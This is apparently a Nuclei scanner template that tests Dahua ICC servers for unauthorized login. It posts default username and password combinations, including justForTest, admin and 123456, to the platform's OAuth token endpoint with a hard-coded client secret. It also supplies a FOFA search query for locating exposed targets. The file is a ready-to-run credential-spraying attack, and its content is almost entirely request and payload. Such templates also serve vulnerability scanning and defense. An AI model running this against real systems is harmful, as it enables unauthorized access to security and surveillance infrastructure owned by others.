id: dahua_icc_login_unauthorized
info:
  name: "Dahua_ICC 接口未授权登录漏洞"
  author: Xc1Ym
  severity: medium
  description: 该漏洞如果成果，则可以使用justForTest/1登录用户
  metadata:
    max-request: 1
    verified: true
    fofa-query: icon_hash="-1935899595",body="*客户端会小于800*"
  tags: Dahua_ICC

http:
  - raw:
      - |
        POST /evo-apigw/evo-oauth/oauth/token HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        username={{username}}&password={{password}}&grant_type=password&client_id=web_client&client_secret=web_client&public_key=

    attack: clusterbomb

    payloads:
      username:
        - justForTest
        - system
        - admin

      password:
        - "123456"
        - admin
        - "12345"

    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"success":'
          - '"access_token":'
          - '"token_type":'
        condition: and

      - type: status
        status:
          - 200

    extractors:
      - type: dsl
        dsl:
          - username + ":" + password
